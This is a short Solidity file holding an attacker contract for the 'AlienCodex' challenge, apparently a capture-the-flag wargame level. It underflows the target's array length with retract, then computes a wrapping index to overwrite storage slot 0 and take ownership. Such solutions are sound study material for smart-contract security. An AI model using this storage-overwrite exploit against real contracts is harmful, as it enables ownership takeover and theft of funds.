// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        IAlienCodex(challengeInstance).makeContact();
        IAlienCodex(challengeInstance).retract();
        unchecked {
            uint index = uint256(2) ** uint256(256) - uint256(keccak256(abi.encode(uint256(1))));
            IAlienCodex(challengeInstance).revise(index, bytes32(uint256(uint160(msg.sender))));
        }
    }
}